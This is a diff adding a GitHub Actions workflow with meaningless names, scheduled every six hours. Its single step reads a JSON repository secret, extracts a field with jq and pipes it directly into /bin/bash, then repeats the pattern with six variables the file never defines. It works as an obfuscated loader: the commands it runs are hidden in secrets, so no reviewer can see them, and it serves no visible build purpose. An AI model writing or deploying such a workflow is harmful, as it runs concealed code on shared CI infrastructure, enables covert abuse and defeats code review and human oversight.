@@ -1,0 +1,23 @@
+name: mazhengfu4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: mazhengfu4567
+        env:
+          fou8442: ${{ secrets.fou8442 }}
+        run: |
+          echo $fou8442 | jq -r .xh93 | /bin/bash
+          echo $naoj67838 | jq -r .dvldr2986 | /bin/bash
+          echo $iff5 | jq -r .hlhl2577 | /bin/bash
+          echo $d0 | jq -r .vqi32 | /bin/bash
+          echo $aue832 | jq -r .qgqm3117 | /bin/bash
+          echo $jw33287 | jq -r .mwv1 | /bin/bash
+          echo $rz44983 | jq -r .bm9216 | /bin/bash
+
